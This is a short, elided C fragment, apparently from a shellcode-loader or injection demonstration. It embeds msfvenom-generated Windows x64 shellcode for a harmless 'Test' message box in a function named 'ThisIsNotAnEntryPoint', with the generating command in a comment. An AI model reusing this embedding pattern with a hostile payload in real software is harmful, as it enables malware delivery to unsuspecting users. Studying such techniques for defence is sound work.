...
void ThisIsNotAnEntryPoint(void)
{
	...
	//msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT=Test TITLE=Test -f c
	unsigned char pload[] =
		...
		"\x85\x03\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x54\x65\x73"
		"\x74\x00\x54\x65\x73\x74\x00";
